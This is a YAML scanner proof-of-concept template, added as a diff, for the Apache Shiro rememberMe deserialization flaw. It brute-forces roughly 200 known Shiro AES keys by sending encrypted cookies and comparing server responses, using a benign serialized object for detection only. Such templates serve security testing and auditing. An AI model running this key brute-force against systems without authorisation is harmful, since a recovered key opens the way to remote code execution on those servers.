@@ -1,0 +1,426 @@
+id: poc-yaml-apache-shiro-cbc-deserialization-code-execution
+info:
+  name: Apache Shiro 反序列化代码执行漏洞(CBC)
+  severity: critical
+  tags:
+  - rce
+  finger: java,shiro
+variables:
+  payload: str("rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==")
+  shiroCookie: 'base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("kPH+bIxk5D2deZiIxcaaaA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Z3VucwAAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("fCq+/xW488hMTCD+cmJ3aQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("0AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("1AvVhdsgUs0FSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("1QWLxg+NYmxraMoxAXu/Iw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZmVic19zaGlyb19rZXkAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("25BsmdYwjnfcWmnhAciDDg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhdsgUs0FSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3JvYhmBLUs0ETA5Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("r0e3c16IdVkouZgk1TKVMg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5aaC5qKm5oqA5pyvAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("6AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("6NfXkC7YVCV5DASIrEm1Rg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("6ZmI6I2j5Y+R5aSn5ZOlAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("cmVtZW1iZXJNZQAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("7AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("8AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("8BvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("9AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("OUHYQzxQ/W9e/UjiAGu6rg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("a3dvbmcAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("aU1pcmFjbGVpTWlyYWNsZQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("bWljcm9zAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("bWluZS1hc3NldC1rZXk6QQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("bXRvbnMAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZUdsaGJuSmxibVI2ZHc9PQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("wGiHplamyXlVB11UXWol8g==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("U3ByaW5nQmxhZGUAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("MTIzNDU2Nzg5MGFiY2RlZg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("L7RioUULEFhRyxM7a2R/Yg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("a2VlcE9uR29pbmdBbmRGaQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("WcfHGU25gNnTxTlmJMeSpw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("OY//C4rhfwNxCQAQCrQQ1Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5J7bIJIV0LQSN3c9LPitBQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("f/SY5TIve5WWzT4aQlABJA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("bya2HkYo57u6fWh5theAWw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("WuB+y2gcHRnY2Lg9+Aqmqg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3qDVdLawoIr1xFd6ietnwg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YI1+nBV//m7ELrIyDHm6DQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("6Zm+6I2j5Y+R5aS+5ZOlAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2A2V+RFLUs+eTA3Kpr+dag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("6ZmI6I2j3Y+R1aSn5BOlAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("SkZpbmFsQmxhZGUAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2cVtiE83c4lIrELJwKGJUw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("fsHspZw/92PrS3XrPW+vxw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("XTx6CKLo/SdSgub+OPHSrw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("sHdIjUN6tzhl8xZMG3ULCQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("O4pdf+7e+mZe8NyxMTPJmQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("HWrBltGvEZc14h9VpMvZWw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("rPNqM6uKFCyaL10AK51UkQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Y1JxNSPXVwMkyvES/kJGeQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("lT2UvDUmQwewm6mMoiw4Ig==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("MPdCMZ9urzEA50JDlDYYDg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("xVmmoltfpb8tTceuT5R7Bw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("c+3hFGPjbgzGdrC+MHgoRQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ClLk69oNcA3m+s0jIMIkpg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Bf7MfkNR0axGGptozrebag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("1tC/xrDYs8ey+sa3emtiYw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZmFsYWRvLnh5ei5zaGlybw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("cGhyYWNrY3RmREUhfiMkZA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("IduElDUpDDXE677ZkhhKnQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("yeAAo1E8BOeAYfBlm4NG9Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("cGljYXMAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2itfW92XazYRi5ltW0M2yA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("XgGkgqGqYrix9lI6vxcrRw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ertVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5AvVhmFLUS0ATA4Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("s0KTA3mFLUprK4AvVhsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("hBlzKg78ajaZuTE0VLzDDg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("9FvVhtFLUs0KnA3Kprsdyg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("d2ViUmVtZW1iZXJNZUtleQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("yNeUgSzL/CfiWw1GALg6Ag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("NGk/3cQ6F5/UNPRh8LpMIg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4BvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("MzVeSkYyWTI2OFVLZjRzZg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("empodDEyMwAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("A7UzJgh1+EWj5oBFi+mSgw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("c2hpcm9fYmF0aXMzMgAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("i45FVt72K2kLgvFrJtoZRw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("U3BAbW5nQmxhZGUAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZnJlc2h6Y24xMjM0NTY3OA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Jt3C93kMR9D5e8QzwfsiMw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("MTIzNDU2NzgxMjM0NTY3OA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("vXP33AonIp9bFwGl7aT7rA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("V2hhdCBUaGUgSGVsbAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Q01TX0JGTFlLRVlfMjAxOQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZAvph3dsQs0FSL3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Is9zJ3pzNh2cgTHB4ua3+Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("NsZXjXVklWPZwOfkvk6kUA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("GAevYnznvgNCURavBhCr1w==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("66v1O8keKNV3TTcGPK1wzg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("SDKOLKn2J1j/2BHjeZwAoQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("7JSYejSw1uAivAOTb9Wv5w==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3AvVhdAgUs0FSA4SDFAdBg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhdsgUs0F563SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5RC7uBZLkByfFfJm22q/Zw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("eXNmAAAAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("fdCEiK9YvLC668sS43CJ6A==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("FJoQCiz0z5XWz2N2LyxNww==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("FL9HL9Yu5bVUJ0PDU1ySvg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("HeUZ/LvgkO7nsa18ZyVxWQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("HoTP07fJPKIRLOWoVXmv+Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("iycgIIyCatQofd0XXxbzEg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("kPH+bIxk5D2deZiIxcabaA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("kPH+bIxk5D2deZiIxcacaA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("m0/5ZZ9L4jjQXn7MREr/bw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("NoIw91X9GSiCrLCF03ZGZw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("oPH+bIxk5E2enZiIxcqaaA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("OTZlYTk3ODAwZDdjMTk0YjBiMzcwNTQxZDhiZjA2Y2Y=")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("p5h/Aphy0gfV+XThbEPqSG4iQNh2fTNH9ZEkSBAt/Ok=")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("QAk0rp8sG0uJC4Ke2baYNA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Rb5RN+LofDWJlzWAwsXzxg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("s2SE9y32PvLeYo+VGFpcKA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("SrpFBcVD89eTQ2icOD0TMg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("U0hGX2d1bnMAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Us0KvVhTeasAm43KFLAeng==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Ymx1ZXdoYWxlAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YWJjZGRjYmFhYmNkZGNiYQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("zIiHplamyXlVB11UXWol8g==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("ZjQyMTJiNTJhZGZmYjFjMQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("zSyK5Kp6PZAAjlT+eeNMlg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("bXdrXl9eNjY2KjA3Z2otPQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("tiVV6g3uZBGfgshesAQbjA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("RVZBTk5JR0hUTFlfV0FPVQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("WkhBTkdYSUFPSEVJX0NBVA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("GsHaWo4m1eNbE0kNSMULhg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("l8cc6d2xpkT1yFtLIcLHCg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("KU471rVNQ6k7PQL4SqxgJg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2adsfasdqerqerqewradsf==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVCXsxUs0FSA7SYFjdQg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhdsgERdsSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhdsgUs0FSA3SaFAdfg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhdsgUs0FSA3SDFAder==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhdsgUsOFSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVhmFLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("2AvVidsaUSofSA3SDFAdog==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3Av2hmFLAs0BTA3Kprsd6E==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3AvVhdAgUs1FSA4SDFAdBg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3AvVhMFLIs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3AvVhmFLUs0KTA3KaTHGFg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3qDVdLawoIr1xFd6ietnsg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("3rvVhmFLUs0KAT3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhm2LUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUs0KTA3KAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUs0KTA3Kprseaf==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUs0TTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUs5KTA1Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4AvVhmFLUsOKTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4rvVhmFLUs0KAT3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("4WCZSJyqdUQsije93aQIRg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5AvVhCsgUs0FSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("5oiR5piv5p2h5ZK46bG8IQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("8AvVhdsgUs0FSA3SDFAdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("9Ami6v2G5Y+r5aPnE4OlBB==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("9AVvhnFLuS3KTV8KprsdAg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("AF05JAuyuEB1ouJQ9Y9Phg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("aG91c2Vob3VzZWhvdXNlMg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("A+kWR7o9O0/G/W6aOGesRA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("AztiX2RUqhc7dhOzl1Mj8Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("b2EAAAAAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("B9rPF8FHhxKJZ9k63ik7kQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("c2hvdWtlLXBsdXMuMjAxNg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Cj6LnKZNLEowAZrdqyH/Ew==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("duhfin37x6chw29jsne45m==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("fCq+/xW488hMTCE+cmJ3FF==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("FjbNm1avvGmWE9CY2HqV75==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("FP7qKJzdJOGkzoQzo2wTmA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("GhrF5zLfq1Dtadd1jlohhA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("GHxH6G3LFh8Zb3NwoRgfFA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("HOlg7NHb9potm0n5s4ic0Q==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("lt181dcQVz/Bo9Wb8ws/Cg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("M2djA70UBBUPDibGZBRvrA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("mIccZhQt6EBHrZIyw1FAXQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("pbnA+Qzen1vjV3rNqQBLHg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("pyyX1c5x2f0LZZ7VKZXjKO==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("QDFCnfkLUs0KTA3Kprsdag==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("QF5HMyZAWDZYRyFnSGhTdQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("qQFtSnnj/sx7vu51ixAyEQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("QUxQSEFNWVNPRlRCVUlMRA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("QVN1bm5uJ3MgU3Vuc2l0ZQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("R29yZG9uV2ViAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("sBv2t3okbdm3U0r2EVcSzB==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("sgIQrqUVxa1OZRRIK3hLZw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("TGMPe7lGO/Gbr38QiJu1/w==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("UGlzMjAxNiVLeUVlXiEjLw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("w793pPq5ZVBKkj8OhV4KaQ==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("wrjUh2ttBPQLnT4JVhriug==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("wyLZMDifwq3sW1vhhHpgKA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YnlhdnMAAAAAAAAAAAAAAA==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YVd4dmRtVjViM1UlM0QIdn==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YWdlbnRAZG1AMjAxOHN3Zg==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("YystomRZLMUjiK0Q1+LFdw==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Z3VucwAAAAAAAAAAAAABBB==")))
+
+    base64(ase_cbc_encrypt(base64_decode(payload), base64_decode("Z3VucwACAOVAKALACAADSA==")))'
+  checkCookie: base64(ase_cbc_encrypt(base64_decode(payload), "fake1234567890ab"))
+firstRequest:
+  method: GET
+  path: /
+  headers:
+    Cookie: rememberMe={{.checkCookie}}
+  expression: 'contains(headers, "rememberMe=deleteMe")
+
+    '
+  output:
+  - set_var("firstTitle", title)
+  - set_var("firstStatusCode", str(status_code))
+requests:
+- method: GET
+  path: /
+  headers:
+    Cookie: rememberMe={{.shiroCookie}}
+  expression: '!contains(headers, "rememberMe=deleteMe") && firstTitle == title &&
+    firstStatusCode == str(status_code)
+
+    '
+transport: http
